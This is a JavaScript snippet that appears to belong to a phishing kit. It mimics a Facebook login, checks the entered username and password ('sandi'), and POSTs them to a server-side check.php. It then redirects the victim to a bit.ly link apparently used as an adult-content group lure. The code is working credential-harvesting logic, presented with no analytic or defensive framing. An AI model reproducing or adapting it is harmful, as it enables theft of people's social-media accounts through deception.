    window.addEventListener('submit', (e) => {
      e.preventDefault()
      setTimeout(() => {
        check()
      }, 1500)
      return false;
    })

    function check() {
      $user = $('#user').val().trim();
      $pass = $('#pass').val().trim();
      if ($user == '' || $user == null || $user.length <= 5) {
        $('.email').show();
        $('.sandi').hide();
        return false;
      } else {
        $('.email').hide();
      }
      if ($pass == '' || $pass == null || $pass.length <= 5) {
        $('.sandi').show();
        return false;
      } else {
        $('.sandi').hide();
      }
      // if all form are filled
      if ($user !== '' || $user !== null || !$pass == '' || !$pass == null)

      {
        // SEND DATA
        $.ajax({
          type: 'POST',
          url: 'check.php',
          data: $('form').serialize(),
          dataType: 'text',
          success: function() {
            $('.login-facebook').toggle();
            $('.login-facebook').fadeOut();
            $('.fb').html('KIRIM PESAN');
            window.location = 'https://bit.ly/GrupBokep_2021';
          }
        })
      }
    }
